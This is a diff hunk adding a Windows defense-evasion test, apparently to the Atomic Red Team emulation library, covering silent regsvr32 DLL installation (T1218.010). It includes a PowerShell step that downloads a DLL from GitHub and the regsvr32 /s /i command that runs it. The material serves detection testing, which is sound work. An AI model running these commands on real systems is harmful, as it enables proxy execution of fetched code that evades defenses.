@@ -37850,6 +37850,37 @@ defense-evasion:
         elevation_required: false
         command: "#{regsvr32path}\\#{regsvr32name} /s #{dll_file}\n"
         cleanup_command: "#{regsvr32path}\\#{regsvr32name} /U /s #{dll_file}\n"
+    - name: Regsvr32 Silent DLL Install Call DllRegisterServer
+      auto_generated_guid: 9d71c492-ea2e-4c08-af16-c6994cdf029f
+      description: Regsvr32.exe is a command-line program used to register and unregister
+        OLE controls. Normally, an install is executed with /n to prevent calling
+        DllRegisterServer.
+      supported_platforms:
+      - windows
+      input_arguments:
+        dll_name:
+          description: Name of DLL to Install
+          type: String
+          default: PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll
+        regsvr32path:
+          description: Default location of Regsvr32.exe
+          type: String
+          default: C:\Windows\system32
+        regsvr32name:
+          description: Default name of Regsvr32.exe
+          type: String
+          default: regsvr32.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: AllTheThingsx86.dll must exist on disk at specified location
+          (#{dll_name})
+        prereq_command: 'if (Test-Path #{dll_name}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{dll_name}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}"
+      executor:
+        command: "#{regsvr32path}\\#{regsvr32name} /s /i #{dll_name}"
+        name: command_prompt
   T1036.003:
     technique:
       external_references:
